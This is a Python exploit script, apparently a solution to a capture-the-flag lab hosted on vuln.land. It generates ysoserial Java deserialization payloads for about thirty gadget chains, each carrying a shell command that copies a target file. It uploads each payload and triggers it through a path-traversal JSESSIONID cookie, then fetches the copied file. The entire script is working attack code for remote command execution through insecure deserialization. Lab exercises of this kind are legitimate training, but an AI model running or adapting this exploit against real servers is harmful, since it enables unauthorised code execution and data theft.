#!/usr/bin/env python3

import requests
from os import system
from time import sleep

url = 'https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/'

def upload_file(filename):
    with open(filename, 'rb') as input_file:
        data = input_file.read()

    files = {'file': (filename, data)}

    response = requests.post(url, files=files)
    if not "harmless" in response.text:
        print(f"Valid payload: {filename}")
    else:
        print("Payload not valid")

payloads = ["BeanShell1", "C3P0", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", 
    "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "FileUpload1", 
    "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient", "JRMPListener", "JSON1", "JavassistWeld1", 
    "Jdk7u21", "Jython1", "MozillaRhino1", "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Wicket1"]

for payload in payloads:
    file = f"payload_{payload}.session"
    system(f"java -jar ysoserial-master-6eca5bc740-1.jar {payload} 'cp /usr/bin/catnip.txt /usr/local/uploads/' > {file} 2>/dev/null")

    # 1. Upload the payload
    upload_file(file)

    # 2. Trigger the exploit
    fake_session_id = f'JSESSIONID=../../../../../usr/local/uploads/payload_{payload}'
    headers = { 'Cookie': fake_session_id }
    print(url + "index.jsp")
    response = requests.get(url + "index.jsp", headers=headers)

    # 3. Check if it worked
    response = requests.get(url + "files/catnip.txt")
    if response.status_code != 404:
        print(response.text)
        exit(0)

    system(f"rm {file}")
    print("------------------------------------------------")
